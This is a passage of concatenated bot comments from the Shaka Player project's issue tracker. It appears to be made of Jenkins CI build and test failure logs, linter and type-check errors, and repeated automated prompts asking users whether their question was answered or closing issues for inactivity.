Infinity, maxSegmentDuration_: 5, clockOffset_: 0, static_: true }) to equal .\n    Expected $.periods[0].startTime = 0 to equal .\n    Expected $.periods[0].variants[0].id = 3 to equal .\n    Expected $.periods[0].variants[0].audio to have properties\n        label: null\n    Expected $.periods[0].variants[0].video to have properties\n        label: null\n        at test/hls/hls_parser_unit.js:61:49\n        at \nHlsParser constructs DrmInfo for Widevine FAILED\n    Expected $.presentationTimeline = ({ presentationStartTime_: null, presentationDelay_: 0, duration_: 5, segmentAvailabilityDuration_: Infinity, maxSegmentDuration_: 5, clockOffset_: 0, static_: true }) to equal .\n    Expected $.periods[0].startTime = 0 to equal .\n    Expected $.periods[0].variants[0].id = 2 to equal .\n    Expected $.periods[0].variants[0].video to have properties\n        label: null\n        at test/hls/hls_parser_unit.js:61:49\n        at \nOfflineUtils reconstructPeriod will reconstruct Periods correctly FAILED\n    Expected object not to have properties\n        label: ''\n        at verifyStream (test/offline/offline_utils_unit.js:266:22)\n        at Object. (test/offline/offline_utils_unit.js:65:7)\nOfflineUtils reconstructPeriod will reconstruct Periods correctly FAILED\n    Expected object not to have properties\n        label: 'English'\n        at verifyStream (test/offline/offline_utils_unit.js:266:22)\n        at Object. (test/offline/offline_utils_unit.js:66:7)\nOfflineUtils reconstructPeriod supports text streams FAILED\n    Expected object not to have properties\n        label: 'English'\n        at verifyStream (test/offline/offline_utils_unit.js:266:22)\n        at Object. (test/offline/offline_utils_unit.js:112:7)\nStorage lists stored manifests FAILED\n    Expected $[0] not to have properties\n        label: undefined\n        at test/offline/storage_unit.js:166:34\n        at \nPlayer tracks returns the correct tracks FAILED\n    Expected $[0] not to have properties\n        label: null\n    Expected $[1] not to have properties\n        label: null\n    Expected $[2] not to have properties\n        label: null\n    Expected $[3] not to have properties\n        label: null\n    Expected $[4] not to have properties\n        label: null\n        at Object. (test/player_unit.js:905:35)\nFailed 15 tests, passed 1141, skipped 44\n. All tests passed!. All tests passed!. All tests passed!. All tests passed!. All tests passed!. All tests passed!. All tests passed!. Test Failure:\nGenerating Closure dependencies...\nRunning Closure linter...\n----- FILE  :  /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/lib/offline/storage.js -----\nLine 301, E:0110: Line too long (90 characters).\nLine 425, E:0110: Line too long (90 characters).\n----- FILE  :  /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/test/offline/offline_integration.js -----\nLine 161, E:0110: Line too long (98 characters).\nLine 201, E:0010: Missing semicolon at end of line\n----- FILE  :  /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/test/offline/storage_unit.js -----\nLine 873, E:0002: Missing space before \"{\"\nLine 876, E:0002: Missing space before \"{\"\nLine 998, E:0002: Missing space before \"{\"\nFound 7 errors, including 1 new errors, in 3 files (183 files OK).\nBuild step 'Execute shell' marked build as failure\n. All tests passed!. Test Failure:\nGenerating Closure dependencies...\nRunning Closure linter...\n191 files checked, no errors found.\nnpm WARN deprecated minimatch@2.0.10: Please update to minimatch 3.0.2 or higher to avoid a RegExp DoS issue\nnpm WARN deprecated minimatch@0.3.0: Please update to minimatch 3.0.2 or higher to avoid a RegExp DoS issue\nnpm WARN deprecated node-uuid@1.4.8: Use uuid module instead\nnpm WARN deprecated tough-cookie@2.2.2: ReDoS vulnerability parsing Set-Cookie https://nodesecurity.io/advisories/130\nnpm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@^1.0.0 (node_modules/chokidar/node_modules/fsevents):\nnpm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.1.2: wanted {\"os\":\"darwin\",\"arch\":\"any\"} (current: {\"os\":\"linux\",\"arch\":\"x64\"})\nRunning htmlhint...\nConfig loaded: /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/.htmlhintrc\nConfig loaded: /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/.htmlhintrc\nConfig loaded: /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/.htmlhintrc\nScanned 3 files, no errors found (43 ms).\nChecking that the build files are complete...\nChecking the tests for type errors...\nCompiling the library...\nBuilding the docs...\nSTART-TEST\nAttributeError: 'module' object has no attribute 'Run'\nBuild step 'Execute shell' marked build as failure\n. Test Failure:\nGenerating Closure dependencies...\nRunning Closure linter...\n191 files checked, no errors found.\nnpm WARN deprecated minimatch@2.0.10: Please update to minimatch 3.0.2 or higher to avoid a RegExp DoS issue\nnpm WARN deprecated minimatch@0.3.0: Please update to minimatch 3.0.2 or higher to avoid a RegExp DoS issue\nnpm WARN deprecated node-uuid@1.4.8: Use uuid module instead\nnpm WARN deprecated tough-cookie@2.2.2: ReDoS vulnerability parsing Set-Cookie https://nodesecurity.io/advisories/130\nnpm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@^1.0.0 (node_modules/chokidar/node_modules/fsevents):\nnpm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.1.2: wanted {\"os\":\"darwin\",\"arch\":\"any\"} (current: {\"os\":\"linux\",\"arch\":\"x64\"})\nRunning htmlhint...\nConfig loaded: /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/.htmlhintrc\nConfig loaded: /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/.htmlhintrc\nConfig loaded: /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/.htmlhintrc\nScanned 3 files, no errors found (69 ms).\nChecking that the build files are complete...\nChecking the tests for type errors...\nCompiling the library...\nBuilding the docs...\nSTART-TEST\nAttributeError: 'module' object has no attribute 'Run'\nBuild step 'Execute shell' marked build as failure\n. All tests passed!. All tests passed!. All tests passed!. Test Failure:\nGenerating Closure dependencies...\nRunning Closure linter...\n195 files checked, no errors found.\nnpm WARN deprecated minimatch@2.0.10: Please update to minimatch 3.0.2 or higher to avoid a RegExp DoS issue\nnpm WARN deprecated minimatch@0.3.0: Please update to minimatch 3.0.2 or higher to avoid a RegExp DoS issue\nnpm WARN deprecated node-uuid@1.4.8: Use uuid module instead\nnpm WARN deprecated tough-cookie@2.2.2: ReDoS vulnerability parsing Set-Cookie https://nodesecurity.io/advisories/130\nnpm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@^1.0.0 (node_modules/chokidar/node_modules/fsevents):\nnpm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.1.2: wanted {\"os\":\"darwin\",\"arch\":\"any\"} (current: {\"os\":\"linux\",\"arch\":\"x64\"})\nRunning htmlhint...\nConfig loaded: /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/.htmlhintrc\nConfig loaded: /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/.htmlhintrc\nConfig loaded: /var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/.htmlhintrc\nScanned 3 files, no errors found (42 ms).\nChecking that the build files are complete...\nChecking the tests for type errors...\n/var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/demo/offline_section.js:184: ERROR - Violation: Using \"Element.children\" is not allowed: use Node.childNodes instead\nfor (var i = 0; i < group.children.length; i++) {\n^^^^^^^^^^^^^^\n/var/lib/jenkins/jobs/Manual PR Test (local-tests)/workspace/demo/offline_section.js:185: ERROR - Violation: Using \"Element.children\" is not allowed: use Node.childNodes instead\nvar option = group.children[i];\n^^^^^^^^^^^^^^\n2 error(s), 0 warning(s), 96.1% typed\nBuild failed\nEND-BUILD: FAILURE\n. All tests passed!. All tests passed!. Test Failure:\nGenerating Closure dependencies...\nRunning Closure linter...\n----- FILE  :  /var/lib/jenkins/workspace/Manual PR Test (local-tests)/lib/player.js -----\nLine 66, E:0006: Wrong indentation: expected any of {2, 17} but got 8\nLine 66, E:0001: Extra space after \"=\"\nFound 2 errors, including 1 new errors, in 1 files (195 files OK).\nEND-BUILD: FAILURE\n. Test Failure:\nGenerating Closure dependencies...\nRunning Closure linter...\n196 files checked, no errors found.\nRunning htmlhint...\nConfig loaded: /var/lib/jenkins/workspace/Manual PR Test (local-tests)/.htmlhintrc\nConfig loaded: /var/lib/jenkins/workspace/Manual PR Test (local-tests)/.htmlhintrc\nConfig loaded: /var/lib/jenkins/workspace/Manual PR Test (local-tests)/.htmlhintrc\nScanned 3 files, no errors found (27 ms).\nChecking that the build files are complete...\nChecking the tests for type errors...\n/var/lib/jenkins/workspace/Manual PR Test (local-tests)/lib/player.js:59: ERROR - Bad type annotation. Unknown type shaka.util.EvenFakerEventTarget\n* @extends {shaka.util.EvenFakerEventTarget}\n^\n1 error(s), 0 warning(s)\nBuild failed\nEND-BUILD: FAILURE\n. Test Failure:\nChrome 61.0.3163 (Linux 0.0.0)\n  Player load/unload won't start loading until unloading is done FAILED\n    Expected false to be true.\n        at test/player_unit.js:233:30\n        at \nPlayer load/unload destroys TextDisplayer on unload FAILED\n    Expected spy destroy to have been called.\n        at test/player_unit.js:244:41\n        at \nPlayer load/unload handles repeated load/unload FAILED\n    Expected spy FakeManifestParser.stop to have been called.\n        at test/player_unit.js:256:30\n        at \nExpected spy FakeManifestParser.stop to have been called.\n    at test/player_unit.js:263:30\n    at <anonymous>\n\nPlayer load/unload handles repeated loads FAILED\n    Expected 0 to be 2.\n        at test/player_unit.js:273:44\n        at \nPlayer load/unload handles load interrupting load FAILED\n    Failed\n        at \nFailed\n    at <anonymous>\n\nExpected 0 to be 2.\n    at test/player_unit.js:285:42\n    at <anonymous>\n\nExpected 0 to equal 2.\n    at test/player_unit.js:286:44\n    at <anonymous>\n\nPlayer load/unload handles unload interrupting load FAILED\n    Failed\n        at \nFailed\n    at <anonymous>\n\nExpected 0 to be 2.\n    at test/player_unit.js:301:42\n    at <anonymous>\n\nExpected 0 to equal 2.\n    at test/player_unit.js:302:44\n    at <anonymous>\n\nPlayer load/unload handles multiple unloads interrupting load FAILED\n    Failed\n        at \nFailed\n    at <anonymous>\n\nExpected 0 to be 2.\n    at test/player_unit.js:332:42\n    at <anonymous>\n\nExpected 0 to equal 2.\n    at test/player_unit.js:333:44\n    at <anonymous>\n\nPlayer load/unload interruption during manifest type check FAILED\n    Failed\n        at \nPlayer load/unload interruption during parser startup FAILED\n    Failed: Wrong error type!\n        at Object.jasmineAssert [as assert] (test/test/boot.js:51:9)\n        at shaka.Player. (lib/player.js:688:18)\n        at \nExpected undefined to be 7000.\n    at test/player_unit.js:383:30\n\nExpected 0 to equal 1.\n    at test/player_unit.js:385:16\n\nPlayer load/unload interruption during DrmEngine init FAILED\n    Failed\n        at \nPlayer load/unload interruption during DrmEngine attach FAILED\n    Failed\n        at \nPlayer load/unload interruption during StreamingEngine init FAILED\n    Failed\n        at \nPlayer getStats .stateHistory begins with buffering state FAILED\n    Expected $.length = 0 to equal 1.\n    Expected $[0] = undefined to equal Object({ timestamp: 1505510007.075, duration: 0, state: 'buffering' }).\n        at UserContext. (test/player_unit.js:1782:48)\nPlayer getStats .stateHistory transitions to paused if the video is paused FAILED\n    Expected $.length = 0 to equal 2.\n    Expected $[0] = undefined to equal Object({ timestamp: , duration: , state: 'buffering' }).\n    Expected $[1] = undefined to equal Object({ timestamp: , duration: , state: 'paused' }).\n        at UserContext. (test/player_unit.js:1796:48)\nPlayer getStats .stateHistory transitions to playing if the video is playing FAILED\n    Expected $.length = 0 to equal 2.\n    Expected $[0] = undefined to equal Object({ timestamp: , duration: , state: 'buffering' }).\n    Expected $[1] = undefined to equal Object({ timestamp: , duration: , state: 'playing' }).\n        at UserContext. (test/player_unit.js:1814:48)\nPlayer getStats .stateHistory transitions to ended when the video ends FAILED\n    Expected $.length = 0 to equal 2.\n    Expected $[0] = undefined to equal Object({ timestamp: , duration: , state: 'playing' }).\n    Expected $[1] = undefined to equal Object({ timestamp: , duration: , state: 'ended' }).\n        at UserContext. (test/player_unit.js:1835:48)\nPlayer getStats .stateHistory accumulates duration as time passes FAILED\n    Expected $.length = 0 to equal 1.\n    Expected $[0] = undefined to equal Object({ timestamp: 1505510007.075, duration: 0, state: 'buffering' }).\n        at UserContext. (test/player_unit.js:1854:48)\nExpected $.length = 0 to equal 1.\nExpected $[0] = undefined to equal Object({ timestamp: 1505510007.075, duration: 1.5, state: 'buffering' }).\n    at UserContext.<anonymous> (test/player_unit.js:1863:48)\n\nExpected $.length = 0 to equal 2.\nExpected $[0] = undefined to equal Object({ timestamp: 1505510007.075, duration: 1.5, state: 'buffering' }).\nExpected $[1] = undefined to equal Object({ timestamp: 1505510008.575, duration: 9, state: 'playing' }).\n    at UserContext.<anonymous> (test/player_unit.js:1874:48)\n\nPlayer restrictions issues error if no streams are playable FAILED\n    Expected spy error event to have been called.\n        at test/player_unit.js:2419:25\n        at \nPlayer isAudioOnly detects audio-only content FAILED\n    Expected true to equal false.\n        at test/player_unit.js:2600:38\n        at \nPlayer getStats gives stats about current stream FAILED\n    Expected $.stateHistory = [  ] to equal , duration:  }) ])>.\n        at test/player_integration.js:140:23\n        at \nPlayer plays with external text tracks FAILED\n    Expected 0 to be 1.\n        at test/player_integration.js:191:35\n        at \nFailed: Cannot read property 'active' of undefined\nTypeError: Cannot read property 'active' of undefined\n    at test/player_integration.js:193:30\n    at <anonymous>\n\nFailed 21 tests, passed 1219, skipped 41\n. All tests passed!. All tests passed!. All tests passed!. All tests passed!. All tests passed!. All tests passed!. All tests passed!. All tests passed!. Test Failure:\nGenerating Closure dependencies...\nRunning Closure linter...\n205 files checked, no errors found.\nRunning htmlhint...\nConfig loaded: /var/lib/jenkins/workspace/Manual PR Test (local-tests)/.htmlhintrc\nConfig loaded: /var/lib/jenkins/workspace/Manual PR Test (local-tests)/.htmlhintrc\nConfig loaded: /var/lib/jenkins/workspace/Manual PR Test (local-tests)/.htmlhintrc\nScanned 3 files, no errors found (28 ms).\nChecking that the build files are complete...\nChecking the tests for type errors...\nChecking the usability of generated externs...\nCompiling the library (debug)...\nCompiling the demo app (debug)...\nCompiling the receiver app (debug)...\nCompiling the library (release)...\nCompiling the demo app (release)...\nCompiling the receiver app (release)...\nBuilding the docs...\nERROR: Unable to create a Tag object for source file /var/lib/jenkins/workspace/Manual PR Test (local-tests)/externs/shaka/player.js with title \"typedef\" and body \" {{\ncustomScheme: shakaExtern.DashContentProtectionCallback,\nclockSyncUri: string,\nignoreDrmInfo: boolean,\nxlinkFailGracefully: boolean,\ndefaultPresentationDelay: number,\n}}\n\": Invalid type expression \"{\ncustomScheme: shakaExtern.DashContentProtectionCallback,\nclockSyncUri: string,\nignoreDrmInfo: boolean,\nxlinkFailGracefully: boolean,\ndefaultPresentationDelay: number,\n}\": Expected \"!\", \"$\", \"'\", \"(\", \"*\", \"...\", \"?\", \"Function\", \"\\\"\", \"\\\", \"_\", \"break\", \"case\", \"catch\", \"class\", \"const\", \"continue\", \"debugger\", \"default\", \"delete\", \"do\", \"else\", \"enum\", \"export\", \"extends\", \"false\", \"finally\", \"for\", \"function\", \"if\", \"implements\", \"import\", \"in\", \"instanceof\", \"interface\", \"let\", \"new\", \"null\", \"package\", \"private\", \"protected\", \"public\", \"return\", \"static\", \"super\", \"switch\", \"this\", \"throw\", \"true\", \"try\", \"typeof\", \"undefined\", \"var\", \"void\", \"while\", \"with\", \"yield\", \"{\", Unicode letter number, Unicode lowercase letter, Unicode modifier letter, Unicode other letter, Unicode titlecase letter or Unicode uppercase letter but \"}\" found.\nERROR: Unable to create a Tag object for source file /var/lib/jenkins/workspace/Manual PR Test (local-tests)/externs/shaka/player.js with title \"typedef\" and body \" {{\ncustomScheme: shakaExtern.DashContentProtectionCallback,\nclockSyncUri: string,\nignoreDrmInfo: boolean,\nxlinkFailGracefully: boolean,\ndefaultPresentationDelay: number,\n}}\n\": Invalid type expression \"{\ncustomScheme: shakaExtern.DashContentProtectionCallback,\nclockSyncUri: string,\nignoreDrmInfo: boolean,\nxlinkFailGracefully: boolean,\ndefaultPresentationDelay: number,\n}\": Expected \"!\", \"$\", \"'\", \"(\", \"*\", \"...\", \"?\", \"Function\", \"\\\"\", \"\\\", \"_\", \"break\", \"case\", \"catch\", \"class\", \"const\", \"continue\", \"debugger\", \"default\", \"delete\", \"do\", \"else\", \"enum\", \"export\", \"extends\", \"false\", \"finally\", \"for\", \"function\", \"if\", \"implements\", \"import\", \"in\", \"instanceof\", \"interface\", \"let\", \"new\", \"null\", \"package\", \"private\", \"protected\", \"public\", \"return\", \"static\", \"super\", \"switch\", \"this\", \"throw\", \"true\", \"try\", \"typeof\", \"undefined\", \"var\", \"void\", \"while\", \"with\", \"yield\", \"{\", Unicode letter number, Unicode lowercase letter, Unicode modifier letter, Unicode other letter, Unicode titlecase letter or Unicode uppercase letter but \"}\" found.\nEND-BUILD: FAILURE\nBuild step 'Execute shell' marked build as failure\n. All tests passed!. All tests passed!. All tests passed!. Test Failure:\nChrome 64.0.3282 (Linux 0.0.0)\n  DrmEngine init fails if license server is not configured FAILED\n    Expected spy shaka.log.error to have been called.\n        at test/media/drm_engine_unit.js:505:29\n        at \nFailed 1 tests, passed 1321, skipped 45\n. All tests passed!. All tests passed!. All tests passed!. @kingctan Does this answer all your questions?  Can we close the issue?. @kingctan Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @gaxunil Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @stuartflanagan Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. All tests passed!. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @boredom2 Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. All tests passed!. All tests passed!. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @sparkyish Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @Mathieu-R Does this answer all your questions?  Can we close the issue?. @Mathieu-R Does this answer all your questions?  Can we close the issue?. All tests passed!. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @philippk80 Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @Tilakv Does this answer all your questions?  Can we close the issue?. @Tilakv Does this answer all your questions?  Can we close the issue?. @Tilakv Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @Tilakv Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @parmendratyagi Does this answer all your questions?  Can we close the issue?. @dmunozpolo Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Test Failure:\nChrome 67.0.3396 (Linux 0.0.0)\n  DashParser Live stop interrupts UTCTiming requests FAILED\n    Expected spy request to have been called with [ 0,  ] but actual calls were [ 4, Object({ uris: [ 'http://foo.bar/date' ], method: 'GET', body: null, headers: Object({  }), allowCrossSiteCredentials: false, retryParameters: Object({ maxAttempts: 2, baseDelay: 1000, backoffFactor: 2, fuzzFactor: 0.5, timeout: 0 }) }) ].\n        at Function.shaka.test.FakeNetworkingEngine.expectRequest (test/test/util/fake_networking_engine.js:91:22)\n        at shaka.test.FakeNetworkingEngine.expectRequest (test/test/util/fake_networking_engine.js:215:35)\n        at test/dash/dash_parser_live_unit.js:894:23\n        at eval (node_modules/promise-polyfill/lib/index.js:61:13)\nFailed 1 tests, passed 1352, skipped 51\n. All tests passed!. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @vaage Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. All tests passed!. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @TheJohnBowers Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @payelmondal123 Does this answer all your questions?  Can we close the issue?. @payelmondal123 Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. All tests passed!. @samaduttan Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. All tests passed!. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @krvangala Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. All tests passed!. All tests passed!. @BlessingD Does this answer all your questions?  Can we close the issue?. @hanumantha03 Does this answer all your questions?  Can we close the issue?. @sridhard Does this answer all your questions?  Can we close the issue?. @sridhard Does this answer all your questions?  Can we close the issue?. All tests passed!. @waxidiotic Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @mjaddani Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. All tests passed!. All tests passed!. @parth2094 Does this answer all your questions?  Can we close the issue?. @parth2094 Does this answer all your questions?  Can we close the issue?. All tests passed!. All tests passed!. @marcbaechinger Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. All tests passed!. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. @chrisfillmore Does this answer all your questions?  Can we close the issue?. @hdodev Does this answer all your questions?  Can we close the issue?. @MonoGO Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. All tests passed!. All tests passed!. @jkringen Does this answer all your questions?  Can we close the issue?. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. Closing due to inactivity.  If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including `@shaka-bot reopen` in a comment.. All tests passed!. @macoybarayan Does this answer all your questions?  Can we close the issue?. @dusan-turajlic Does this answer all your questions?  Can we close the issue?. @dusan-turajlic Does this answer all your questions?  Can we close the issue?. @PaulChira46 Does this answer all your questions?  Can we close the issue?. @amanrajveer Does this answer all your questions?  Can we close the issue?. All tests passed!. Test Failure:\nFailed to parse log file!\n. All tests passed!. Test Failure:\nChrome 72.0.3626 (Linux 0.0.0)\n  Player constructor sets video.src when video is provided FAILED\n    Expected '' to be truthy.\n        at UserContext.toBeTruthy (test/player_integration.js:84:25)\n        at tryCatch (node_modules/babel-polyfill/dist/polyfill.js:6900:40)\n        at Generator.invoke [as _invoke] (node_modules/babel-polyfill/dist/polyfill.js:7138:22)\n        at Generator.prototype.(anonymous function) [as next] (node_modules/babel-polyfill/dist/polyfill.js:6952:21)\nFailed 1 tests, passed 1516, skipped 5\n. Test Failure:\nGenerating Closure dependencies...\nLinting JavaScript...\n/var/lib/jenkins/workspace/Manual PR Test (local-tests)/lib/polyfill/mediasource.js\n318:1  error  Trailing spaces not allowed  no-trailing-spaces\n\u2716 1 problem (1 error, 0 warnings)\n1 error, 0 warnings potentially fixable with the --fix option.\nEND-BUILD: FAILURE\nBuild step 'Execute shell' marked build as failure\n. Test Failure:\nGenerating Closure dependencies...\nLinting JavaScript...\n/var/lib/jenkins/workspace/Manual PR Test (local-tests)/lib/polyfill/mediasource.js\n318:1  error  Trailing spaces not allowed  no-trailing-spaces\n\u2716 1 problem (1 error, 0 warnings)\n1 error, 0 warnings potentially fixable with the --fix option.\nEND-BUILD: FAILURE\nBuild step 'Execute shell' marked build as failure\n. Test Failure:\nGenerating Closure dependencies...\nLinting JavaScript...\nLinting HTML...\nConfig loaded: /var/lib/jenkins/workspace/Manual PR Test (local-tests)/.htmlhintrc\nConfig loaded: /var/lib/jenkins/workspace/Manual PR Test (local-tests)/.htmlhintrc\nConfig loaded: /var/lib/jenkins/workspace/Manual PR Test (local-tests)/.htmlhintrc\nScanned 3 files, no errors found (22 ms).\nChecking that the build files are complete...\nChecking the tests for type errors...\n/var/lib/jenkins/workspace/Manual PR Test (local-tests)/test/media/media_source_engine_unit.js:165: ERROR - Access to private property createObjectURL_ of shaka.media.MediaSourceEngine not allowed here.\nshaka.media.MediaSourceEngine.createObjectURL_;\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n/var/lib/jenkins/workspace/Manual PR Test (local-tests)/test/media/media_source_engine_unit.js:180: ERROR - Access to private property createObjectURL_ of shaka.media.MediaSourceEngine not allowed here.\nshaka.media.MediaSourceEngine.createObjectURL_ =\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n/var/lib/jenkins/workspace/Manual PR Test (local-tests)/test/media/media_source_engine_unit.js:180: ERROR - constant property createObjectURL_ assigned a value more than once\nshaka.media.MediaSourceEngine.createObjectURL_ =\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n/var/lib/jenkins/workspace/Manual PR Test (local-tests)/test/media/media_source_engine_unit.js:192: ERROR - Access to private property createObjectURL_ of shaka.media.MediaSourceEngine not allowed here.\nshaka.media.MediaSourceEngine.createObjectURL_ = originalCreateObjectURL;\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n/var/lib/jenkins/workspace/Manual PR Test (local-tests)/test/media/media_source_engine_unit.js:192: ERROR - constant property createObjectURL_ assigned a value more than once\nshaka.media.MediaSourceEngine.createObjectURL_ = originalCreateObjectURL;\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n5 error(s), 0 warning(s), 91.7% typed\nBuild failed\nEND-BUILD: 